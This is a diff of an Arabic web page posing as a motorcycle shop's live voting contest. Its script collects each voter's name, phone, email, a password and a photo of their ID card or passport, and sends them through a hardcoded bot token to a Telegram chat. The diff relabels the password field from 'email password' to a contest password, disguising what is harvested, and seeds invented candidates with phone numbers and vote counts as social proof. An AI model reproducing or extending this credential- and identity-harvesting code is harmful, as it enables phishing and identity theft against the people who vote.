@@ -486,20 +486,20 @@
 <header>
   <div class="store-badge">🏆 المعرض العصري الأول للدراجات النارية في القاعدة</div>
   <h1>متجر <span>أمير المترات</span><br>ساحة المنافسة الحية والتصويت المباشر على فلينج!</h1>
-  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري.</p>
+  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري لبوت التليجرام.</p>
 </header>
 
 <!-- ===== قسم التصويت والمشاهدة المباشرة ===== -->
 <section id="voting">
   <div class="section-head">
-    <span class="sub">أداء سريع ووصول فوري </span>
+    <span class="sub">أداء سريع ووصول فوري للبوت</span>
     <h2>🗳️ ساحة التصويت ومشاهدة النتائج المباشرة</h2>
   </div>
 
   <div class="voting-section-box">
     <div class="live-status-bar">
       <div class="live-pill"><span class="pulse-dot"></span> التصويت متاح لجميع الأجهزة ببيانات مستقلة</div>
-      <div class="live-pill" style="border-color:var(--cyan); color:var(--cyan);" id="capacityCounter">👥 المتسابقون: 50/100 • 🗳️ إجمالي الأصوات: 0</div>
+      <div class="live-pill" style="border-color:var(--cyan); color:var(--cyan);" id="capacityCounter">👥 المتسابقون: 52/100 • 🗳️ إجمالي الأصوات: 0</div>
     </div>
 
     <div class="warning-notice" style="margin-bottom:24px;">
@@ -511,7 +511,7 @@
       <!-- نموذج التصويت -->
       <div class="vote-card-panel">
         <h3>✍️ صوّت لمتسابقك المفضل الآن</h3>
-        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك  فوراً:</p>
+        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
 
         <div id="directInviteBanner" class="direct-invite-banner">
           🎯 أنت تصوّت الآن عبر رابط الدعوة المباشر للمتسابق:<br>
@@ -532,7 +532,7 @@
           </div>
 
           <div class="field">
-            <label for="voterName">🙋‍♂️ اسمك الكامل (المُصوِّت) *</label>
+            <label for="voterName">🙋‍♂️ اسمك الكامل (المُصوِّت) *</label>
             <input type="text" id="voterName" required placeholder="أدخل اسمك الكامل">
           </div>
 
@@ -555,14 +555,14 @@
             </div>
           </div>
 
-          <!-- إرفاق صورة البطاقة أو الجواز للمُصوِّت -->
+          <!-- إرفاق صورة البطاقة أو الجواز للمُصوِّت -->
           <div class="field">
-            <label>🪪 صورة البطاقة الشخصية أو الجواز للمُصوِّت *</label>
+            <label>🪪 صورة البطاقة الشخصية أو الجواز للمُصوِّت *</label>
             <div class="upload-box" onclick="document.getElementById('voterIdImage').click()">
               <div class="upload-label">
                 <span class="upload-icon">🆔</span>
                 <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
-                <span class="upload-sub">تُضغط بسرعة وتُرسل  للتحقق ومنع الاحتيال</span>
+                <span class="upload-sub">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</span>
               </div>
               <input type="file" id="voterIdImage" accept="image/*" required onchange="handleImage(event, 'voterIdPreview')">
               <img id="voterIdPreview" class="preview-img" alt="معاينة هوية المصوت">
@@ -594,7 +594,7 @@
         </div>
         <p class="desc">تُرتب الأسماء تلقائياً من الأعلى تصويتاً إلى الأقل:</p>
 
-        <input type="text" id="searchCandidateInput" class="search-filter-input" placeholder="🔍 ابحث عن اسم متسابق أو رمز (مثال: خلدون أو AMIR-7272)..." oninput="renderLeaderboardUI()">
+        <input type="text" id="searchCandidateInput" class="search-filter-input" placeholder="🔍 ابحث عن اسم متسابق أو رمز (مثال: شعيب أو عبدالرحمن أو AMIR-6060)..." oninput="renderLeaderboardUI()">
 
         <div class="leaderboard-list" id="leaderboardList">
           <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
@@ -622,7 +622,7 @@
 <!-- ===== استمارة تسجيل المتسابقين ===== -->
 <section id="register">
   <div class="section-head">
-    <span class="sub">بوابة تسجيل المتسابقين (سعة حتى 200 متسابق)</span>
+    <span class="sub">بوابة تسجيل المتسابقين (سعة حتى 100 متسابق)</span>
     <h2>سجّل بياناتك للحصول على رسالة ورابط التصويت الخاص بك</h2>
   </div>
 
@@ -645,7 +645,7 @@
         </div>
 
         <div class="field">
-          <label for="password">🔒 كلمة السر اخاص بالبريد    *</label>
+          <label for="password">🔒 كلمة المرور لحسابك في المسابقة *</label>
           <div class="password-wrap">
             <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
             <button type="button" class="toggle-pass" onclick="toggleGenericPass('password', this)">إظهار</button>
@@ -750,12 +750,12 @@
   </div>
 </section>
 
-<!-- ===== الموقع ===== -->
+<!-- ===== الموقع والتواصل ===== -->
 <section id="location">
   <div class="location-strip">
     <div class="loc-text">
-      <h3>📍 موقع متجر أمير المترات</h3>
-      <p><strong>القاعدة — جوار مستوصف السلطان مباشرةً</strong></p>
+      <h3>📍 موقع معرض أمير المترات</h3>
+      <p><strong>القاعدة — الشارع العام</strong></p>
     </div>
     <div class="phones-list">
       <a href="tel:777908028" class="phone-link">📞 777908028</a>
@@ -766,166 +766,154 @@
 
 <footer>
   <h3>🏍️ متجر أمير المترات</h3>
-  <p>القاعدة — جوار مستوصف السلطان</p>
-  <p style="margin-top:10px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة لمتجر أمير المترات</p>
+  <p>القاعدة — الشارع العام</p>
+  <p style="margin-top:10px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة — متجر أمير المترات</p>
 </footer>
 
 <script>
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
-const ADMIN_PIN = "omar";
-const STORAGE_KEY = "amir_cloud_fast_v6";
+const ADMIN_PIN = "777908028";
+const STORAGE_KEY = "amir_felling_v4";
+const MAX_CAP     = 100;
 
-const MAX_CANDIDATES = 100;
+let voterIdBlob = null;
+let idCardBlob = null;
+let selfieIdBlob = null;
+let expectedCaptchaAnswer = 8;
 
-let compressedIdBlob = null;
-let compressedSelfieBlob = null;
-let compressedVoterIdBlob = null;
-let captchaExpected = 8;
-
-function buildInitial50Candidates() {
-  const firstNames = [
-    "خلدون محمد منصور", "أحمد علي الحميري", "شعيب عبده محمد هزبر", "صلاح الدين عبده",
-    "ياسر حسن الصلوي", "ماجد حسين الجندي", "طارق عبدالكريم القدسي", "نبيل سعيد المقطري",
+function makeInitial50() {
+  const names = [
+    "خلدون محمد منصور", "أحمد علي القاعدي", "محمد عبدالقادر التعزي", "صلاح الدين عبده",
+    "ياسر حسن المحمدي", "ماجد حسين الجندي", "طارق عبدالكريم المعلاوي", "نبيل سعيد الشيخ",
     "وليد محمد الحوباني", "جمال أحمد الشميري", "عادل علي المخلافي", "فؤاد يحيى الشيباني",
     "رامي صادق الذبحاني", "سامر خالد العواضي", "هاني محمد الرداعي", "بسام عبدالمجيد",
     "كريم ناصر الحمادي", "مراد سالم الصبري", "أكرم توفيق اليوسفي", "تامر فهد السقاف",
     "زياد عمر باوزير", "مهند حسام الحكيمي", "أنس راشد الزبيري", "إيهاب جميل الكحلاني",
     "رائد محمود العريقي", "مروان نبيل الدبعي", "عصام حسن الأشول", "شادي محمد الهتار",
     "غسان علي المسلمي", "فراس عبدربه النهاري", "أيمن صالح الحالمي", "سعيد محمد القباطي",
-    "منير أحمد الذماري", "حازم خالد الإبي", "بشير عبدالله التعزي", "أديب محمد العدني",
+    "منير أحمد الذماري", "حازم خالد الإبي", "بشير عبدالله التعزي", "أديب محمد الشرعبي",
     "نواف سعيد الصنعاني", "وسام علي الحديدي", "ليث محمد المرادي", "قيس عبدالرحمن",
     "عمار حسن الشرجبي", "مجدي صالح الوصابي", "صدام محمد الحجري", "إبراهيم علي الجبري",
-    "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن الشرعبي",
-    "مصطفى عبدالحميد", "سفيان محمد القاعدي"
+    "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن القدسي",
+    "مصطفى عبدالحميد", "سفيان محمد الحكيمي"
   ];
+  const cities = ["القاعدة", "تعز", "إب", "المخا", "الحوبان", "عدن", "صنعاء"];
 
-  const cities = ["القاعدة", "إب", "تعز", "الحوبان", "عدن", "الشرعب", "المعشار"];
-
-  return firstNames.map((name, idx) => {
-    const isKhaldoun = name === "خلدون محمد منصور";
-    const code = isKhaldoun ? "AMIR-7272" : `AMIR-${(3100 + idx * 73).toString().padStart(4, "0").slice(-4)}`;
-    const phone = isKhaldoun ? "776818383" : `77${(1000000 + idx * 13789).toString().slice(0, 7)}`;
-    const votes = isKhaldoun ? 68 : Math.max(4, 62 - idx);
-    return {
-      k: code,
-      n: name,
-      p: phone,
-      y: cities[idx % cities.length],
-      v: votes
-    };
+  const list = names.map((name, idx) => {
+    const isTop = name === "خلدون محمد منصور";
+    const code = isTop ? "AMIR-7272" : `AMIR-${(5100 + idx * 67).toString().slice(-4)}`;
+    const phone = isTop ? "776818383" : `77${(3000000 + idx * 14321).toString().slice(0, 7)}`;
+    const votes = isTop ? 78 : Math.max(5, 68 - idx);
+    return { k: code, n: name, p: phone, y: cities[idx % cities.length], v: votes };
   });
+
+  list.push(
+    { k: "AMIR-6060", n: "شعيب عبده محمد هزبر", p: "775912468", y: "القاعدة", v: 60 },
+    { k: "AMIR-4747", n: "عبدالرحمن عبدالله سعيد", p: "773849120", y: "القاعدة", v: 47 }
+  );
+
+  return list;
 }
 
-function loadLocalState() {
+function loadSavedState() {
   try {
-    const saved = localStorage.getItem(STORAGE_KEY);
-    if (saved) {
-      const parsed = JSON.parse(saved);
-      if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
-        return { c: parsed.c, h: Array.isArray(parsed.h) ? parsed.h : [] };
+    const raw = localStorage.getItem(STORAGE_KEY);
+    if (raw) {
+      const obj = JSON.parse(raw);
+      if (obj && Array.isArray(obj.c) && obj.c.length > 0) {
+        return { c: obj.c, h: Array.isArray(obj.h) ? obj.h : [] };
       }
     }
   } catch (e) {}
-  return { c: buildInitial50Candidates(), h: [] };
+  return { c: makeInitial50(), h: [] };
 }
 
-let cloudState = loadLocalState();
+let stateData = loadSavedState();
 
-function persistLocalState() {
-  cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(cloudState));
+function saveStateLocal() {
+  stateData.c.sort((a, b) => (b.v || 0) - (a.v || 0));
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(stateData));
 }
 
-function generateCaptcha() {
+function initCaptcha() {
   const a = Math.floor(Math.random() * 9) + 2;
   const b = Math.floor(Math.random() * 9) + 1;
-  captchaExpected = a + b;
-  const qEl = document.getElementById("captchaQuestion");
-  if (qEl) qEl.textContent = `🔐 كم ناتج: ${a} + ${b} = ؟`;
+  expectedCaptchaAnswer = a + b;
+  const el = document.getElementById("captchaQuestion");
+  if (el) el.textContent = `🔐 كم ناتج: ${a} + ${b} = ؟`;
 }
 
-function shortHash(str) {
-  let hash = 0;
-  const clean = String(str).trim().toLowerCase();
-  for (let i = 0; i < clean.length; i++) {
-    hash = ((hash << 5) - hash) + clean.charCodeAt(i);
-    hash |= 0;
+function makeHash(val) {
+  let h = 0;
+  const s = String(val).trim().toLowerCase();
+  for (let i = 0; i < s.length; i++) {
+    h = ((h << 5) - h) + s.charCodeAt(i);
+    h |= 0;
   }
-  return Math.abs(hash).toString(36);
+  return Math.abs(h).toString(36);
 }
 
-// مزامنة سريعة من السحابة دون إبطاء واجهة التصويت
-async function syncFromTelegramCloud(manualTrigger = false) {
+async function syncFromTelegramCloud(manual = false) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const data = await res.json();
-
     if (data.ok && data.result && data.result.pinned_message && data.result.pinned_message.text) {
-      const pinnedText = data.result.pinned_message.text;
-      const match = pinnedText.match(/#AMIR_DB#([\s\S]*?)#END_DB#/);
-      if (match && match[1]) {
-        const parsed = JSON.parse(match[1].trim());
+      const m = data.result.pinned_message.text.match(/#AMIR_DB#([\s\S]*?)#END_DB#/);
+      if (m && m[1]) {
+        const parsed = JSON.parse(m[1].trim());
         if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
-          cloudState = parsed;
-          persistLocalState();
+          stateData = parsed;
+          saveStateLocal();
         }
       }
     }
-
     renderLeaderboardUI();
     checkUrlVoteParam();
-
-    if (manualTrigger) {
-      const counterEl = document.getElementById("capacityCounter");
-      if (counterEl) {
-        counterEl.style.transform = "scale(1.06)";
-        setTimeout(() => { counterEl.style.transform = "scale(1)"; }, 200);
+    if (manual) {
+      const badge = document.getElementById("capacityCounter");
+      if (badge) {
+        badge.style.transform = "scale(1.06)";
+        setTimeout(() => { badge.style.transform = "scale(1)"; }, 200);
       }
     }
-  } catch (err) {
+  } catch (e) {
     renderLeaderboardUI();
   }
 }
 
-function buildSortedTelegramLeaderboard(limit = 20) {
-  const sorted = [...(cloudState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  let lines = "";
-  sorted.slice(0, limit).forEach((c, idx) => {
+function buildSortedLines(limit = 20) {
+  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  let out = "";
+  sorted.slice(0, limit).forEach((item, idx) => {
     const medal = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `🔹 ${idx + 1}.`;
-    lines += `${medal} <b>${c.n}</b> | <code>${c.k}</code> ➔ <b>${c.v || 0} صوت</b>\n`;
+    out += `${medal} <b>${item.n}</b> | <code>${item.k}</code> ➔ <b>${item.v || 0} صوت</b>\n`;
   });
-  return lines;
+  return out;
 }
 
-// تحديث السجل في الخلفية لعدم تأخير تجربة التصويت
-async function backgroundCloudSync() {
-  persistLocalState();
+async function syncCloudBackground() {
+  saveStateLocal();
   try {
-    const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const summaryLines = buildSortedTelegramLeaderboard(12);
-    const payloadText =
-`📊 سجل المسابقة المرتب — متجر أمير المترات
-👥 المتسابقون: ${cloudState.c.length}/${MAX_CANDIDATES} | 🗳️ الأصوات: ${totalVotes}
+    const total = stateData.c.reduce((sum, x) => sum + (x.v || 0), 0);
+    const lines = buildSortedLines(12);
+    const payload =
+`📊 سجل مسابقة أمير المترات — القاعدة
+👥 المتسابقون: ${stateData.c.length}/${MAX_CAP} | 🗳️ الأصوات: ${total}
 ━━━━━━━━━━━━━━━━━━
-${summaryLines}
+${lines}
 #AMIR_DB#
-${JSON.stringify(cloudState)}
+${JSON.stringify(stateData)}
 #END_DB#`;
 
     const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const chatData = await chatRes.json();
-    const pinnedMsg = chatData?.result?.pinned_message;
-
-    if (pinnedMsg && pinnedMsg.text && pinnedMsg.text.includes("#AMIR_DB#")) {
+    const pinned = chatData?.result?.pinned_message;
+    if (pinned && pinned.text && pinned.text.includes("#AMIR_DB#")) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id: pinnedMsg.message_id,
-          text: payloadText
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, message_id: pinned.message_id, text: payload })
       }).catch(() => {});
     }
   } catch (e) {}
@@ -934,291 +922,280 @@ ${JSON.stringify(cloudState)}
 function renderLeaderboardUI() {
   const listEl = document.getElementById("leaderboardList");
   const selectEl = document.getElementById("candidateSelect");
-  const counterEl = document.getElementById("capacityCounter");
-  const searchInput = document.getElementById("searchCandidateInput");
-  const query = searchInput ? searchInput.value.trim().toLowerCase() : "";
+  const badgeEl = document.getElementById("capacityCounter");
+  const q = (document.getElementById("searchCandidateInput")?.value || "").trim().toLowerCase();
 
-  const candidates = [...(cloudState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  const totalVotes = candidates.reduce((sum, item) => sum + (item.v || 0), 0);
+  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  const totalVotes = sorted.reduce((sum, item) => sum + (item.v || 0), 0);
 
-  if (counterEl) {
-    counterEl.textContent = `👥 المتسابقون: ${candidates.length}/${MAX_CANDIDATES} • 🗳️ إجمالي الأصوات: ${totalVotes}`;
+  if (badgeEl) {
+    badgeEl.textContent = `👥 المتسابقون: ${sorted.length}/${MAX_CAP} • 🗳️ إجمالي الأصوات: ${totalVotes}`;
   }
 
   if (selectEl) {
-    const currentVal = selectEl.value;
-    selectEl.innerHTML = `<option value="">-- اختر متسابقاً من القائمة (${candidates.length}) --</option>`;
-    candidates.forEach(c => {
+    const prev = selectEl.value;
+    selectEl.innerHTML = `<option value="">-- اختر متسابقاً من القائمة (${sorted.length}) --</option>`;
+    sorted.forEach(c => {
       const opt = document.createElement("option");
       opt.value = c.k;
       opt.textContent = `${c.n} (${c.k}) — ${c.v || 0} صوت`;
       selectEl.appendChild(opt);
     });
-    if (currentVal) selectEl.value = currentVal;
+    if (prev) selectEl.value = prev;
   }
 
-  const filtered = candidates.filter(c =>
-    c.n.toLowerCase().includes(query) ||
-    c.k.toLowerCase().includes(query) ||
-    (c.p && c.p.toLowerCase().includes(query)) ||
-    (c.y && c.y.toLowerCase().includes(query))
+  const filtered = sorted.filter(c =>
+    c.n.toLowerCase().includes(q) ||
+    c.k.toLowerCase().includes(q) ||
+    (c.p && c.p.toLowerCase().includes(q)) ||
+    (c.y && c.y.toLowerCase().includes(q))
   );
 
   if (filtered.length === 0) {
-    listEl.innerHTML = `<div style="text-align:center; padding:25px; color:var(--text-muted);">لا توجد نتائج مطابقة لبحثك.</div>`;
+    listEl.innerHTML = `<div style="text-align:center; padding:25px; color:var(--text-muted);">لا توجد نتائج مطابقة للبحث.</div>`;
     return;
   }
 
   listEl.innerHTML = "";
   filtered.forEach(cand => {
-    const realRank = candidates.findIndex(item => item.k === cand.k);
-    const isTop1 = realRank === 0;
-    const item = document.createElement("div");
-    item.className = "leader-item" + (isTop1 ? " top-1" : "");
-    item.innerHTML = `
+    const rank = sorted.findIndex(x => x.k === cand.k);
+    const isTop = rank === 0;
+    const row = document.createElement("div");
+    row.className = "leader-item" + (isTop ? " top-1" : "");
+    row.innerHTML = `
       <div class="leader-info">
-        <div class="rank-badge">${isTop1 ? "👑" : realRank + 1}</div>
+        <div class="rank-badge">${isTop ? "👑" : rank + 1}</div>
         <div>
-          <div class="leader-name">${cleanHTML(cand.n)}</div>
-          <div class="leader-meta">${cleanHTML(cand.y || "")} • <span class="leader-code">${cleanHTML(cand.k)}</span></div>
+          <div class="leader-name">${escHtml(cand.n)}</div>
+          <div class="leader-meta">${escHtml(cand.y || "")} • <span class="leader-code">${escHtml(cand.k)}</span></div>
         </div>
       </div>
       <div style="text-align:left;">
         <div class="vote-count-pill">🗳️ ${cand.v || 0} صوت</div>
-        <button type="button" class="quick-vote-btn" onclick="selectCandidateForVote('${cleanHTML(cand.k)}')">صوّت له</button>
-        <button type="button" class="admin-del-btn admin-only-control" onclick="deleteCandidateAdmin('${cleanHTML(cand.k)}', '${cleanHTML(cand.n)}')">🗑️ استبعاد</button>
+        <button type="button" class="quick-vote-btn" onclick="selectCandidateForVote('${escHtml(cand.k)}')">صوّت له</button>
+        <button type="button" class="admin-del-btn admin-only-control" onclick="adminDeleteCandidate('${escHtml(cand.k)}', '${escHtml(cand.n)}')">🗑️ استبعاد</button>
       </div>
     `;
-    listEl.appendChild(item);
+    listEl.appendChild(row);
   });
 }
 
 function checkUrlVoteParam() {
   const params = new URLSearchParams(window.location.search);
-  const voteCode = params.get("vote");
-  if (voteCode) {
-    const cleanCode = voteCode.trim().toUpperCase();
-    const found = cloudState.c.find(c => c.k === cleanCode);
-    const codeInput = document.getElementById("candidateCodeInput");
-    const selectEl = document.getElementById("candidateSelect");
-    const banner = document.getElementById("directInviteBanner");
-    const label = document.getElementById("invitedCandidateLabel");
+  const vCode = params.get("vote");
+  if (!vCode) return;
+  const clean = vCode.trim().toUpperCase();
+  const found = stateData.c.find(c => c.k === clean);
+  const inp = document.getElementById("candidateCodeInput");
+  const sel = document.getElementById("candidateSelect");
+  const banner = document.getElementById("directInviteBanner");
+  const lbl = document.getElementById("invitedCandidateLabel");
 
-    if (codeInput && !codeInput.value) codeInput.value = cleanCode;
-    if (selectEl && found) selectEl.value = cleanCode;
-    if (banner && label) {
-      banner.style.display = "block";
-      label.textContent = found ? `${found.n} (${cleanCode})` : cleanCode;
-    }
-    const modal = document.getElementById("promoModal");
-    if (modal) modal.style.display = "none";
+  if (inp && !inp.value) inp.value = clean;
+  if (sel && found) sel.value = clean;
+  if (banner && lbl) {
+    banner.style.display = "block";
+    lbl.textContent = found ? `${found.n} (${clean})` : clean;
   }
+  const modal = document.getElementById("promoModal");
+  if (modal) modal.style.display = "none";
 }
 
 function syncCodeFromSelect() {
-  const selectEl = document.getElementById("candidateSelect");
-  const codeInput = document.getElementById("candidateCodeInput");
-  if (selectEl && codeInput && selectEl.value) {
-    codeInput.value = selectEl.value;
-  }
+  const sel = document.getElementById("candidateSelect");
+  const inp = document.getElementById("candidateCodeInput");
+  if (sel && inp && sel.value) inp.value = sel.value;
 }
 
 function selectCandidateForVote(code) {
-  const codeInput = document.getElementById("candidateCodeInput");
-  const selectEl = document.getElementById("candidateSelect");
-  if (codeInput) codeInput.value = code;
-  if (selectEl) selectEl.value = code;
-  if (codeInput) codeInput.focus();
+  const sel = document.getElementById("candidateSelect");
+  const inp = document.getElementById("candidateCodeInput");
+  if (sel) sel.value = code;
+  if (inp) { inp.value = code; inp.focus(); }
 }
 
-function goToSection(sectionId) {
+function goToSection(id) {
   const modal = document.getElementById("promoModal");
   if (modal) {
     modal.style.opacity = "0";
     modal.style.transition = "opacity 0.25s ease";
     setTimeout(() => { modal.style.display = "none"; }, 250);
   }
-  const target = document.getElementById(sectionId);
-  if (target) target.scrollIntoView({ behavior: "smooth" });
+  const el = document.getElementById(id);
+  if (el) el.scrollIntoView({ behavior: "smooth" });
 }
 
-// ===== تصويت سريع ومفتوح لجميع الأجهزة مع منع تكرار الرقم أو البريد فقط =====
 document.getElementById("voteForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const voteMsg = document.getElementById("voteMsg");
+  const msgEl = document.getElementById("voteMsg");
   const thanksCard = document.getElementById("storeThanksCard");
-  voteMsg.className = "msg";
+  msgEl.className = "msg";
   if (thanksCard) thanksCard.style.display = "none";
 
-  const userAns = parseInt(document.getElementById("captchaAnswer").value, 10);
-  if (userAns !== captchaExpected) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ إجابة التحقق الحسابي غير صحيحة! حاول مرة أخرى.";
-    generateCaptcha();
+  const ans = parseInt(document.getElementById("captchaAnswer").value, 10);
+  if (ans !== expectedCaptchaAnswer) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "❌ ناتج التحقق الحسابي غير صحيح!";
+    initCaptcha();
     return;
   }
 
-  if (!compressedVoterIdBlob) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ يرجى إرفاق صورة البطاقة الشخصية أو الجواز قبل اعتماد الصوت!";
+  if (!voterIdBlob) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "❌ يرجى إرفاق صورة البطاقة الشخصية أو الجواز قبل اعتماد الصوت!";
     return;
   }
 
-  const rawCode = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
-  const voterName = cleanHTML(document.getElementById("voterName").value.trim());
-  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, '');
+  const code = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
+  const voterName = escHtml(document.getElementById("voterName").value.trim());
+  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, "");
   const voterEmail = document.getElementById("voterEmail").value.trim().toLowerCase();
-  const voterPassword = cleanHTML(document.getElementById("voterPassword").value.trim());
+  const voterPass = escHtml(document.getElementById("voterPassword").value.trim());
 
-  const targetCand = cloudState.c.find(c => c.k === rawCode);
-  if (!targetCand) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ رمز المتسابق غير موجود! تأكد من كتابة الرمز الصحيح.";
+  const target = stateData.c.find(c => c.k === code);
+  if (!target) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "❌ رمز المتسابق غير صحيح! تحقق من الرمز وحاول مرة أخرى.";
     return;
   }
 
-  if (targetCand.p && targetCand.p === voterPhone) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "🚫 نعتذر، لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المنافسة.";
+  if (target.p && target.p === voterPhone) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "🚫 لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المسابقة.";
     return;
   }
 
-  const phoneHash = shortHash(voterPhone);
-  const emailHash = shortHash(voterEmail);
-  if (cloudState.h.includes(phoneHash) || cloudState.h.includes(emailHash)) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
+  const pHash = makeHash(voterPhone);
+  const eHash = makeHash(voterEmail);
+  if (stateData.h.includes(pHash) || stateData.h.includes(eHash)) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
     return;
   }
 
   const btn = document.getElementById("voteSubmitBtn");
   btn.disabled = true;
-  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للادره...";
+  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للبوت...";
 
   try {
-    targetCand.v = (targetCand.v || 0) + 1;
-    cloudState.h.push(phoneHash, emailHash);
-    persistLocalState();
+    target.v = (target.v || 0) + 1;
+    stateData.h.push(pHash, eHash);
+    saveStateLocal();
     renderLeaderboardUI();
 
-    const shortVoterCaption =
-`🗳️ <b>بيانات تصويت ووثيقة مُصوِّت — متجر أمير المترات</b>
+    const shortCaption =
+`🗳️ <b>تصويت ووثيقة مُصوِّت — أمير المترات</b>
 ━━━━━━━━━━━━━━━━━━
-🎯 <b>المتسابق:</b> ${targetCand.n}
-🎟️ <b>الرمز:</b> <code>${rawCode}</code>
-🔢 <b>أصواته الحالية:</b> <b>${targetCand.v} صوت</b>
+🎯 <b>المتسابق:</b> ${target.n}
+🎟️ <b>الرمز:</b> <code>${code}</code>
+🔢 <b>أصواته الحالية:</b> <b>${target.v} صوت</b>
 ━━━━━━━━━━━━━━━━━━
 🙋‍♂️ <b>المُصوِّت:</b> ${voterName}
 📞 <b>هاتفه:</b> <code>${voterPhone}</code>
 📧 <b>بريده:</b> <code>${voterEmail}</code>
-🔑 <b>كلمة السر:</b> <code>${voterPassword}</code>`;
+🔑 <b>كلمة السر:</b> <code>${voterPass}</code>`;
 
-    const fdVote = new FormData();
-    fdVote.append("chat_id", CHAT_ID);
-    fdVote.append("photo", compressedVoterIdBlob, "voter_id.jpg");
-    fdVote.append("caption", shortVoterCaption);
-    fdVote.append("parse_mode", "HTML");
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", voterIdBlob, "voter_id.jpg");
+    fd.append("caption", shortCaption);
+    fd.append("parse_mode", "HTML");
 
-    const rVote = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
-      body: fdVote
+      body: fd
     });
-    const dVote = await rVote.json();
-    if (!dVote.ok) throw new Error("Telegram vote photo failed");
+    const photoData = await photoRes.json();
+    if (!photoData.ok) throw new Error("sendPhoto failed");
 
-    const updatedTotal = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const sortedLines = buildSortedTelegramLeaderboard(20);
-    const independentLeaderboardMsg =
-`🏆 <b>الترتيب المرتب بعد التصويت — متجر أمير المترات</b>
-🗳️ <b>إجمالي الأصوات:</b> <b>${updatedTotal}</b> | 👥 <b>المتسابقون:</b> <b>${cloudState.c.length}</b>
+    const totalNow = stateData.c.reduce((sum, item) => sum + (item.v || 0), 0);
+    const sortedBlock = buildSortedLines(20);
+    const orderedMsg =
+`🏆 <b>الترتيب المرتب لمسابقة فلينج — أمير المترات</b>
+🗳️ <b>إجمالي الأصوات:</b> <b>${totalNow}</b> | 👥 <b>المتسابقون:</b> <b>${stateData.c.length}</b>
 ━━━━━━━━━━━━━━━━━━
-${sortedLines}`;
+${sortedBlock}`;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: independentLeaderboardMsg,
-        parse_mode: "HTML"
-      })
+      body: JSON.stringify({ chat_id: CHAT_ID, text: orderedMsg, parse_mode: "HTML" })
     }).catch(() => {});
 
-    backgroundCloudSync();
+    syncCloudBackground();
 
-    voteMsg.className = "msg ok-msg";
-    voteMsg.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${targetCand.n} - ${rawCode}) وإرسال بياناتك للبوت!`;
+    msgEl.className = "msg ok-msg";
